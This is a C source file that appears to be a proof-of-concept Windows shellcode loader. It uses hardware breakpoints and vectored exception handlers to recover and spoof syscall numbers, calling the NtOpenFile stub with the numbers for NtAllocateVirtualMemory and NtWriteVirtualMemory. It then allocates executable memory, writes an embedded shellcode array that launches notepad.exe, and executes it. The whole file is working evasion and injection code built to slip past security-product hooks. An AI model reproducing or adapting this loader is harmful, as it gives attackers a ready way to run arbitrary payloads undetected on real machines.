#include <stdio.h>
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

typedef NTSTATUS (WINAPI * NtAllocateVirtualMemory)(HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(WINAPI* NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
VOID (*exec)(VOID);

int ntapi_ssn = 0;
DWORD64 SSN = 0;

VOID SetHWBP(LPVOID address, BOOL setBP) {
    
    CONTEXT context = { 0 };
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &context);

    if (setBP) {
        context.Dr0 = (DWORD64)address;
        context.Dr7 |= (1 << 0);
        context.Dr7 &= ~(1 << 16);
        context.Dr7 &= ~(1 << 17);
    }
    else {
        context.Dr0 = 0;
        context.Dr7 &= ~(1 << 0);
    }

    context.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    SetThreadContext(GetCurrentThread(), &context);
    return;
}

LONG WINAPI handler(EXCEPTION_POINTERS* ExceptionInfo) {
    
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
        if (ExceptionInfo->ContextRecord->Rip == ExceptionInfo->ContextRecord->Dr0) {
            printf("[-] Breakpoint triggered (%#llx):\n", ExceptionInfo->ExceptionRecord->ExceptionAddress);
            printf("[*] Rcx: %#d\n", ExceptionInfo->ContextRecord->Rcx);
            printf("[*] Rip: %I64x, Rax: %I64x\n", ExceptionInfo->ContextRecord->Rip, ExceptionInfo->ContextRecord->Rax);
            printf("[*] ntapi_ssn: %x\n", ntapi_ssn);
            ExceptionInfo->ContextRecord->Rax = ntapi_ssn;
            SetHWBP((LPVOID)ExceptionInfo->ContextRecord->Rip, FALSE);
        }
        ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

LONG WINAPI recover_eax_handler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP) {
        if (ExceptionInfo->ContextRecord->Dr0 == ExceptionInfo->ContextRecord->Rip) {
            SSN = ExceptionInfo->ContextRecord->Rax;
            //printf("[+] Got SSN: %x\n", SSN);
            SetHWBP((LPVOID)ExceptionInfo->ContextRecord->Rip, FALSE);
        }
        ExceptionInfo->ContextRecord->EFlags |= (1 << 16);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

int main()
{
    PVOID baseAddress = NULL;
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00";

    DWORD64 SSN_NtAllocateVirtualMemory, SSN_NtWriteVirtualMemory;
    SIZE_T regionSize = sizeof(shellcode);
    NtAllocateVirtualMemory _NtAllocateVirtualMemory = (NtAllocateVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenFile"));

    NtAllocateVirtualMemory ForSSN_NtAllocateVirtualMemory = (NtAllocateVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll"), "NtAllocateVirtualMemory"));
    NtWriteVirtualMemory ForSSN_NtWriteVirtualMemory = (NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory"));

    printf("[*] Before SSN: %x\n", SSN);

    SetHWBP((LPVOID)((DWORD64)ForSSN_NtAllocateVirtualMemory + 0x12), TRUE);
    AddVectoredExceptionHandler(1, recover_eax_handler);

    ForSSN_NtAllocateVirtualMemory(NULL, NULL, NULL, NULL, NULL, NULL);

    SSN_NtAllocateVirtualMemory = SSN;

    printf("[*] After SSN: %x\n", SSN);

    printf("[*]-------------------------------\n");

    printf("[*] Before SSN: %x\n", SSN);

    SetHWBP((LPVOID)((DWORD64)ForSSN_NtWriteVirtualMemory + 0x12), TRUE);
    AddVectoredExceptionHandler(1, recover_eax_handler);

    ForSSN_NtWriteVirtualMemory(NULL, NULL, NULL, NULL, NULL);
    SSN_NtWriteVirtualMemory = SSN;

    printf("[*] After SSN: %x\n", SSN);

    printf("[*]-------------------------------\n");

    printf("[*] Trying to allocate memory for shellcode...\n");

    SetHWBP((LPVOID)((DWORD64)_NtAllocateVirtualMemory + 0x12), TRUE);
    AddVectoredExceptionHandler(1, handler);

    ntapi_ssn = SSN_NtAllocateVirtualMemory;
    NTSTATUS status = _NtAllocateVirtualMemory(GetCurrentProcess(), &baseAddress, NULL, &regionSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (status == ERROR_SUCCESS) {
        printf("[+] Allocated BaseAddress: %I64x\n", baseAddress);
    }
    else {
        printf("[-] Error: %08X\n", status);
        return -1;
    }

    NtWriteVirtualMemory _NtWriteVirtualMemory = (NtWriteVirtualMemory)(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenFile"));
    SetHWBP((LPVOID)((DWORD64)_NtAllocateVirtualMemory + 0x12), TRUE);
    ntapi_ssn = SSN_NtWriteVirtualMemory;

    printf("[*] Trying to write shellcode to memory...\n");

    printf("[*] Shellcode Size: %d\n", sizeof(shellcode));
    NTSTATUS wr_status = _NtWriteVirtualMemory(GetCurrentProcess(), baseAddress, (PVOID)shellcode, sizeof(shellcode), NULL);

    if (wr_status == ERROR_SUCCESS) {
        printf("[+] Shellcode written successfully\n");
    }
    else {
        printf("[-] Error : %08X\n", wr_status);
    }

    (*(void(*)()) baseAddress)();

    return 0;
}
